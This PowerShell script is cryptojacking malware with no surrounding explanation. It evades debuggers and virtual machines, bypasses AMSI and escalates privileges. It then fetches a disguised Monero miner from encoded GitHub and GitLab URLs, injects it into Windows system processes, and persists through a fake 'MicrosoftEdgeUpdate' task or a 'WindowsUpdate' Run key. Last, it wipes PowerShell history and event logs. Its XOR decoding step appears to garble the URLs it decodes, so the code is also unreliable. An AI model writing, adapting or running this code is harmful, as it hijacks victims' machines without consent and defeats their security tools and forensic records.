$ErrorActionPreference='SilentlyContinue'
if([System.Diagnostics.Debugger]::IsAttached){exit}
$vmProcs=@('vboxservice','vboxtray','vmwaretray','vmtoolsd','xenservice')
foreach($p in $vmProcs){if(Get-Process $p -EA 0){exit}}
if((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*"){exit}
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if(-not $isAdmin){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoP -NonI -W Hidden -Exec Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    $psi.Verb="runas"
    [System.Diagnostics.Process]::Start($psi)|Out-Null;exit
}
try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null),0x01)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]0)}catch{}
try{[System.Management.Automation.PSConsole]::Disable($true)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
$k=@(0x42,0x6B,0x2F,0x7A,0x1C,0x8D,0x4E,0x9F)
$d1='aHR0cHM6Ly9naXRodWIuY29tL2Zzb2NpZXR5NDMyMS9zZm9jaWV0eS9yYXcvcmVmcy9oZWFkcy9tYWluL3N2Y2hvc3QuZXhl'
$d2='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Zzb2NpZXR5NDMyMS9zZm9jaWV0eS9tYWluL3N2Y2hvc3QuZXhl'
$d3='aHR0cHM6Ly9naXRsYWIuY29tL2Zzb2NpZXR5NDMyMS9zZm9jaWV0eS8tL3Jhdy9tYWluL3N2Y2hvc3QuZXhl'
$w='ODRSdllHamZEb0tmUWVDMWRRWGd2OVFHM1BqdEFDRjNDR2RacnV1Q3RGRlRnTmpKTTlSeWNEemF6VmlNTlJvblVhR21CQjdvUFZyMk5BejZYWXZRU3E3WU1kNzIzaG4='
$p1='cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz'
$p2='bWluZXh4bXIuY29tOjQ0NDQ='
$p3='cG9vbC5tb25lcm9oYXNoLmNvbTozMzMz'
function D($a,$b){$c=[Convert]::FromBase64String($a);for($i=0;$i -lt $c.Length;$i++){$c[$i]=$c[$i]-bxor$b[$i%$b.Length]};[Text.Encoding]::UTF8.GetString($c)}
$u1=D $d1 $k;$u2=D $d2 $k;$u3=D $d3 $k
$w=D $w $k
$pool1=D $p1 $k;$pool2=D $p2 $k;$pool3=D $p3 $k
$lockPath="$env:APPDATA\Microsoft\Windows\swill.lock"
if(Test-Path $lockPath){exit}
New-Item $lockPath -Force|Out-Null
$wc=New-Object Net.WebClient
$wc.Timeout=30000
$minerBytes=$null
foreach($url in @($u1,$u2,$u3)){try{$minerBytes=$wc.DownloadData($url);if($minerBytes.Length -gt 1000000){break}}catch{}}
if(-not $minerBytes){exit}
$cores=0
try{$cores=(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors}catch{}
if(-not $cores){$cores=2}
$threads=[math]::Max(1,[math]::Floor($cores*0.7))
$rand=Get-Random
$randNum=$rand % 1000
$activePool=$null
foreach($pool in @($pool1,$pool2,$pool3)){
    try{$wc.DownloadString("http://$pool/")|Out-Null;$activePool=$pool;break}catch{}
}
if(-not $activePool){$activePool=$pool1}
$args="--wallet=$w --pool=$activePool --threads=$threads --keepalive --donate-level=0 --cpu-max-threads-hint=70"
$proc=$null
$processNames=@("svchost","explorer","winlogon","spoolsv","services")
foreach($pn in $processNames){
    $proc=Get-Process -Name $pn -EA 0|Where-Object{$_.Handle}|Select-Object -First 1
    if($proc){break}
}
if(-not $proc){$proc=Start-Process "C:\Windows\System32\svchost.exe" -WindowStyle Hidden -PassThru;Start-Sleep -Milliseconds 1000}
if(-not $proc){exit}
$k32=Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32.dll")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out UIntPtr w);
[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);
[DllImport("kernel32.dll")]public static extern bool CloseHandle(IntPtr h);
'@ -Name "K32" -PassThru
$h=$k32::OpenProcess(0x1F0FFF,$false,$proc.Id)
if($h -ne 0){
    $addr=$k32::VirtualAllocEx($h,0,$minerBytes.Length,0x3000,0x40)
    if($addr -ne 0){
        $k32::WriteProcessMemory($h,$addr,$minerBytes,$minerBytes.Length,[ref][UIntPtr]::Zero)
        $argsBytes=[Text.Encoding]::ASCII.GetBytes($args+"`0")
        $argsAddr=$k32::VirtualAllocEx($h,0,$argsBytes.Length,0x3000,0x40)
        if($argsAddr -ne 0){$k32::WriteProcessMemory($h,$argsAddr,$argsBytes,$argsBytes.Length,[ref][UIntPtr]::Zero)}
        $k32::CreateRemoteThread($h,0,0,$addr,$argsAddr,0,0)
    }
    $k32::CloseHandle($h)
}
if($proc.Id -ne $pid){$proc.Close()}
$randNum=Get-Random
$taskName="MicrosoftEdgeUpdate_$randNum"
$persistScript="@
`$ErrorActionPreference='SilentlyContinue'
`$k=@(0x42,0x6B,0x2F,0x7A,0x1C,0x8D,0x4E,0x9F)
`$d1='$d1';`$d2='$d2';`$d3='$d3'
function D(`$a,`$b){`$c=[Convert]::FromBase64String(`$a);for(`$i=0;`$i -lt `$c.Length;`$i++){`$c[`$i]=`$c[`$i]-bxor`$b[`$i%`$b.Length]};[Text.Encoding]::UTF8.GetString(`$c)}
`$u1=D `$d1 `$k;`$u2=D `$d2 `$k;`$u3=D `$d3 `$k
`$wc=New-Object Net.WebClient
`$b=`$null
foreach(`$u in @(`$u1,`$u2,`$u3)){try{`$b=`$wc.DownloadData(`$u);if(`$b.Length -gt 1000000){break}}catch{}}
if(`$b){`$proc=Get-Process -Name svchost -EA 0|Select-Object -First 1
if(-not `$proc){`$proc=Start-Process 'C:\Windows\System32\svchost.exe' -WindowStyle Hidden -PassThru;Start-Sleep 1}
if(`$proc){`$k32=Add-Type -MemberDefinition '[DllImport(`"kernel32.dll`")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);[DllImport(`"kernel32.dll`")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport(`"kernel32.dll`")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out UIntPtr w);[DllImport(`"kernel32.dll`")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);[DllImport(`"kernel32.dll`")]public static extern bool CloseHandle(IntPtr h);' -Name K32 -PassThru
`$h=`$k32::OpenProcess(0x1F0FFF,`$false,`$proc.Id)
if(`$h -ne 0){`$a=`$k32::VirtualAllocEx(`$h,0,`$b.Length,0x3000,0x40);if(`$a -ne 0){`$k32::WriteProcessMemory(`$h,`$a,`$b,`$b.Length,[ref][UIntPtr]::Zero);`$k32::CreateRemoteThread(`$h,0,0,`$a,0,0,0)};`$k32::CloseHandle(`$h)}}}
"
$persistPath="$env:APPDATA\Microsoft\Windows\p.ps1"
$persistScript|Out-File $persistPath -Encoding ASCII -Force
schtasks /create /tn $taskName /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" /sc onstart /ru SYSTEM /f 2>$null
if($LASTEXITCODE -ne 0){
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" -Force -EA 0
}
Start-Sleep -Seconds 5
$minerRunning=Get-Process|Where-Object{$_.ProcessName -eq "svchost" -and $_.CPU -gt 5 -and $_.Threads.Count -gt 10}|Select-Object -First 1
if(-not $minerRunning){
    foreach($pn in @("explorer","winlogon","spoolsv")){
        $proc=Get-Process -Name $pn -EA 0|Where-Object{$_.Handle}|Select-Object -First 1
        if($proc){break}
    }
    if($proc){
        $h=$k32::OpenProcess(0x1F0FFF,$false,$proc.Id)
        if($h -ne 0){
            $addr=$k32::VirtualAllocEx($h,0,$minerBytes.Length,0x3000,0x40)
            if($addr -ne 0){
                $k32::WriteProcessMemory($h,$addr,$minerBytes,$minerBytes.Length,[ref][UIntPtr]::Zero)
                $argsBytes=[Text.Encoding]::ASCII.GetBytes($args+"`0")
                $argsAddr=$k32::VirtualAllocEx($h,0,$argsBytes.Length,0x3000,0x40)
                if($argsAddr -ne 0){$k32::WriteProcessMemory($h,$argsAddr,$argsBytes,$argsBytes.Length,[ref][UIntPtr]::Zero)}
                $k32::CreateRemoteThread($h,0,0,$addr,$argsAddr,0,0)
            }
            $k32::CloseHandle($h)
        }
        if($proc.Id -ne $pid){$proc.Close()}
    }
}
if($PSVersionTable.PSVersion.Major -ge 3){Clear-History}
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA 0
Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA 0
Get-ChildItem "$env:TEMP\*.ps1" -EA 0|Remove-Item -Force -EA 0
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
Remove-Item $MyInvocation.MyCommand.Path -Force -EA 0
